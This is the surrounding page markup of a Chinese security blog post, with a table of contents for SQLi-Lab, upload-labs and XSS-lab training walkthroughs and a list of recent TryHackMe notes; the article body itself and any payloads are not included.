data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-sqli_lab"><span class="toc-number">1.</span> <span class="toc-text">0x01 SQLi_Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-1"><span class="toc-number">1.1.</span> <span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.1.5.</span> <span class="toc-text">sqlmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-2"><span class="toc-number">1.2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-3"><span class="toc-number">1.3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-4"><span class="toc-number">1.4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-5"><span class="toc-number">1.5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-6"><span class="toc-number">1.6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-7"><span class="toc-number">1.7.</span> <span class="toc-text">Less-7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%88%B0%E6%96%87%E4%BB%B6"><span class="toc-number">1.7.2.</span> <span class="toc-text">导出数据到文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-8"><span class="toc-number">1.8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-9"><span class="toc-number">1.9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-10"><span class="toc-number">1.10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-11"><span class="toc-number">1.11.</span> <span class="toc-text">Less-11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.11.1.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.11.2.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.11.3.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.11.4.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.11.5.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.11.6.</span> <span class="toc-text">sqlmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-12"><span class="toc-number">1.12.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-13"><span class="toc-number">1.13.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-14"><span class="toc-number">1.14.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-15"><span class="toc-number">1.15.</span> <span class="toc-text">Less-15</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-upload-labs"><span class="toc-number">2.</span> <span class="toc-text">0x02 upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-01"><span class="toc-number">2.1.</span> <span class="toc-text">Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E7%A6%81%E7%94%A8js"><span class="toc-number">2.1.1.</span> <span class="toc-text">前端禁用js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bp%E6%8A%93%E5%8C%85"><span class="toc-number">2.1.2.</span> <span class="toc-text">bp抓包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-02"><span class="toc-number">2.2.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-03"><span class="toc-number">2.3.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-04"><span class="toc-number">2.4.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-05"><span class="toc-number">2.5.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-06"><span class="toc-number">2.6.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-07"><span class="toc-number">2.7.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-08"><span class="toc-number">2.8.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-09"><span class="toc-number">2.9.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-10"><span class="toc-number">2.10.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-11"><span class="toc-number">2.11.</span> <span class="toc-text">Pass-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-12"><span class="toc-number">2.12.</span> <span class="toc-text">Pass-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-13"><span class="toc-number">2.13.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-14"><span class="toc-number">2.14.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-15"><span class="toc-number">2.15.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-16"><span class="toc-number">2.16.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-17"><span class="toc-number">2.17.</span> <span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-18"><span class="toc-number">2.18.</span> <span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-19"><span class="toc-number">2.19.</span> <span class="toc-text">Pass-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-20"><span class="toc-number">2.20.</span> <span class="toc-text">Pass-20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-21"><span class="toc-number">2.21.</span> <span class="toc-text">Pass-21</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-xss-lab"><span class="toc-number">3.</span> <span class="toc-text">0x03 Xss-lab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">3.1.</span> <span class="toc-text">level-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">3.2.</span> <span class="toc-text">level-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">3.3.</span> <span class="toc-text">level-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">3.4.</span> <span class="toc-text">level-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">3.5.</span> <span class="toc-text">level-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">3.6.</span> <span class="toc-text">level-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">3.7.</span> <span class="toc-text">level-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">3.8.</span> <span class="toc-text">level-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">3.9.</span> <span class="toc-text">level-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">3.10.</span> <span class="toc-text">level-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-number">3.11.</span> <span class="toc-text">level-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-number">3.12.</span> <span class="toc-text">level-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-number">3.13.</span> <span class="toc-text">level-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-number">3.14.</span> <span class="toc-text">level-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-number">3.15.</span> <span class="toc-text">level-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-number">3.16.</span> <span class="toc-text">level-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-17"><span class="toc-number">3.17.</span> <span class="toc-text">level-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-18"><span class="toc-number">3.18.</span> <span class="toc-text">level-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-19"><span class="toc-number">3.19.</span> <span class="toc-text">level-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-20"><span class="toc-number">3.20.</span> <span class="toc-text">level-20</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
